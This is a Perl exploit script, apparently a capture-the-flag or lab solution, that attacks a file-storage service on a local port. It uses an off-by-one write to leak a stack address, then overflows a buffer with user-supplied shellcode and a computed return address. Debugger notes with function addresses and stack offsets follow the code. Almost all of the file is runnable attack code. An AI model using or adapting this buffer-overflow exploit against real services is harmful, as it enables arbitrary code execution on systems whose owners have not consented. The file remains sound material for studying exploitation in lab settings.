#!/usr/bin/perl -w
#sudo perl -MCPAN -e 'upgrade'
use IO::Socket;
use Getopt::Std;

my $buf;
my $stack;
my $sock;
# exec.bin 38 byte
# $sc = `cat exec.bin`;

# visualisation :D
my %options=();
getopts("dhs:b:", \%options);
#print "-d $options{d}\n" if defined $options{d};
my $error = "[!]";
my $info = "[+]";
my $key = "[?]";
#

if(defined $options{h} || (not defined $options{s}) || (not defined $options{b})){
	print "Exploit buffer overflow for task1\nMax shellcode size 131 bytes\n\t-d\t   Exploit debug flag\n\t-s <path>  Path to shellcode for task1\n\t-b <path>  Path to shellcode for backup\n\n";
	exit(0);
}
#print "-s $options{s}\n" if defined $options{s};
# shellcode task1
if (-e $options{s}){
	print "$info Current shellcode $options{s}\n";
	$sc = `cat $options{s}`;
}
else {
	print "$error File $options{s} not found\n";
	exit(0);
}
#shellcode backup
if (-e $options{b}){
	print "$info Current shellcode $options{b}\n";
	$sc_b = `cat $options{b}`;
}
else {
	print "$error File $options{b} not found\n";
	exit(0);
}
my $length_b = length $sc_b;
my $length = length $sc;
$current_file = 1;

print "$info Step 1: Get stack address!\n";

while(1){
	$sock = IO::Socket::INET->new("127.0.0.1:5555") or die $@;
	$sock->autoflush(1);
	print $sock "PUT:". $current_file ."\n";
	print $sock ":". "A"x240 . "\n";
	# for backup
	#print $sock "BackupInfo:" . $sc_b . "A"x(0x55-$length_b) . pack("L", 0xBFFFEDC7) . "\n";
	print $sock "BackupInfo:" . $sc_b . "\n";
	#
	print $sock "Size:4\n";
	print $sock "A"x4 ."\n";
	
	if ($options{d}){
		print "$key Press key to send PUT request for filename $current_file";
		$press = <>;
		print "$info Continue $press";
	}
	
	$sock = IO::Socket::INET->new("127.0.0.1:5555") or die $@;
	$sock->autoflush(1);
	print $sock "PUT:". $current_file ."\n";
	print $sock "Size:116\n";
	print $sock "A"x115 . "\x8B" . "\n";
	if ($options{d}){
		print "$key Press key to send GET request for filename $current_file";
		$press = <>;
		print "$info Continue $press";
	}
	
	$sock = IO::Socket::INET->new("127.0.0.1:5555") or die $@;
	$sock->autoflush(1);
	print $sock "GET:". $current_file ."\n";
	# skip
	read($sock, $buf, 127);
	# address stack
	read($sock, $stack, 4);
	$stack = unpack("L", $stack);
	if ($stack){
		printf "$info Stack:\t0x%x\n", $stack;
		# temp stack=0xbffffac8 (this is wtf)
		last;
	}
	#else{
	#	print "$error Error step 1!\n";
	#	exit(0);
	#}
	$current_file += 1;
}

print "$info Step 2: Execute shellcode!\n";

# sub SocketStatus {
#     return unless defined $sock;
#     return unless $sock->connected();
#     return 1;
# }

while(1){
	$sock = IO::Socket::INET->new("127.0.0.1:5555") or die $@;
	$sock->autoflush(1);
	print $sock "PUT:". $current_file ."\n";
	print $sock ":". "A"x240 . "\n";
	#print $sock "BackupInfo:" . $sc_b . "A"x(0x55-$length_b) . pack("L", 0xBFFFEDC7) . "\n";
	print $sock "BackupInfo:" . $sc_b . "\n";
	print $sock "Size:4\n";
	print $sock "A"x4 ."\n";
	if ($options{d}){
		print "$key Press key to send PUT request for filename $current_file";
		$press = <>;
		print "$info Continue $press";
	}
	
	$sock = IO::Socket::INET->new("127.0.0.1:5555") or die $@;
	$sock->autoflush(1);
	my $data = $sc . "A"x(131-length($sc)) . pack("L", $stack - 0x109F);
	print $sock "PUT:". $current_file ."\n";
	print $sock "Size:135\n";
	print $sock $data . "\n"; 
	if ($options{d}) {
		print "$key Press key to send GET request for filename $current_file";
		$press = <>;
		print "$info Continue $press";
	}
	
	$sock = IO::Socket::INET->new("127.0.0.1:5555") or die $@;
	$sock->autoflush(1);
	print $sock "GET:". $current_file ."\n";
	read($sock, $buf, 12);
	# unless (!&SocketStatus()){
	if ($buf cmp "file too big"){
		print "$info Success\n";
		last;
	}
	$current_file += 1;
}
# 240
# AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

# 110
# BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

# 131
# CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC

# CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCAAAA

# TPutFile
# start 0x080495c0
# fileName	0xbffffaea

# TIsFileExist
# ok		0xBFFFD86C
# value		0xbfffd77c
# name		0xbfffd68c
# id		0xbfffd663

# TGetFile
# start 0x080499f6
# id		0xBFFFEAC0
# fileName	0xbffffaea

# TGetIdByFileName
# fileName	0xBFFFFAFA
# id		0xBFFFEAC0

# TSendFile
# start 0x8049a44
# buf		0xBFFFEA29
# path		0xBFFFDA29
#
# fd open	0xBFFFEA98 (he is closed)
# filename	0xBFFFEAC0
# 0x08049b0a ret

# TPrintFullMetaFile
# start 0x080498d6
# path		0xbfffc638
# buf		0xBFFFC546

############## backup.elf

# TCheckFilesForBackup
# start 0x08049609
# id		0xBFFFEC4B

# TSaveBackupInfo
# start 0x08049449
# id		0xbfffec4b
# buf		0xbfffeb17
# logFd		0xBFFFEC18
# value		0xBFFFEB22

# TFindFileInIndex
# start 0x08049242
#
#
#

# TUpdateFile
# start 0x08049575
# msg		0xBFFFEBD1
# 
#
# instruction ret
# b* 0x08049608




# chroot
# execvp
# execve
# 0x8049385

